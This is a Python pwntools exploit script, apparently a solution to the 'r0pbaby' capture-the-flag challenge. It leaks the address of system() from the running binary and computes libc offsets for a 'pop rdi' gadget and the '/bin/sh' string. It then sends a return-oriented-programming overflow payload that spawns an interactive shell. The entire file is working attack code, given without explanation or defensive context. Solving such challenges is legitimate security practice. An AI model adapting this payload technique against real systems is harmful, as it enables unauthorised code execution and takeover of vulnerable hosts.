#!/usr/bin/python

from pwn import *


def get_addr_sys(sh):
    sh.sendline('2')
    sh.recv()
    sh.sendline('system')
    ret = sh.recvline().split(' ')[-1]
    sh.recv()
    ret = long(ret, 16)
    return ret


def get_shell(sh, addr_sys, ppc_offset, bin_sh_offset):
    print('addr_sys: %x' % addr_sys)
    print('pop_pop_call_offset: %x' % ppc_offset)
    print('bin_sh_offset: %x' % bin_sh_offset)
    sh.sendline('3')
    sh.recv()
    sh.sendline('32')
    payload = 'A' * 8 + p64(addr_sys + ppc_offset) + p64(addr_sys) + p64(addr_sys + bin_sh_offset)
    print(len(payload))
    sh.sendline(payload)
    sh.recv()
    return


def main():
    sh = process('./r0pbaby')
    addr_sys = get_addr_sys(sh)
    print(addr_sys)
    libc_addr_pop_rdi = 0x0002155f 
    libc_addr_bin_sh = 0x001b3e9a
    libc_addr_sys = 0x0004f440

    ppc_offset = libc_addr_pop_rdi - libc_addr_sys
    bin_sh_offset = libc_addr_bin_sh - libc_addr_sys
    get_shell(sh, addr_sys, ppc_offset, bin_sh_offset)
    sh.interactive()
    #sh.close()


if __name__ == '__main__':
    main()
